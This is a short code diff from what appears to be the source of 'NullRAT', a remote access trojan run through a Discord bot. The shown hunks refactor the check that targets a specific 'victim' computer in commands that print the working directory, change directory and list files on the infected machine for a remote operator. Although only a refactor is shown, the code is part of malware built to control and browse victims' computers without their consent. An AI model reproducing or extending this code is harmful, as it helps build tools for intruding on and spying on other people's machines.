@@ -18,7 +18,7 @@ class DirectoryCommands(commands.Cog):
         ----------
         victim: Identifier of the affected computer (found via /listvictims).
         """
-        if str(victim) == str(self.bot.identifier):
+        if self.valid(victim):
             await ctx.response.send_message(
                 embed=self.bot.genEmbed(
                     "Current directory of NullRAT:", 
@@ -36,7 +36,7 @@ class DirectoryCommands(commands.Cog):
         victim: Identifier of the affected computer (found via /listvictims).
         directory: Directory where NullRAT will change (cd) to
         """
-        if str(victim) == str(self.bot.identifier):
+        if self.valid(victim):
             try:
                 os.chdir(directory)
                 return await ctx.response.send_message(
@@ -58,7 +58,7 @@ class DirectoryCommands(commands.Cog):
         victim: Identifier of the affected computer (found via /listvictims).
         directory: Directory whose contents will be listed (optional)
         """
-        if str(victim) == str(self.bot.identifier):
+        if self.valid(victim):
             if directory != 'null':
                 try: os.chdir(directory)
                 except FileNotFoundError: return await ctx.response.send_message("Invalid directory!")
@@ -83,7 +83,7 @@ class DirectoryCommands(commands.Cog):
         victim: Identifier of the affected computer (found via /listvictims).
         directory: Directory whose contents will be listed (optional)
         """
-        if str(victim) == str(self.bot.identifier):
+        if self.valid(victim):
             try:
                 contents = os.listdir( 
                     os.getcwd() if directory == "null" else directory 
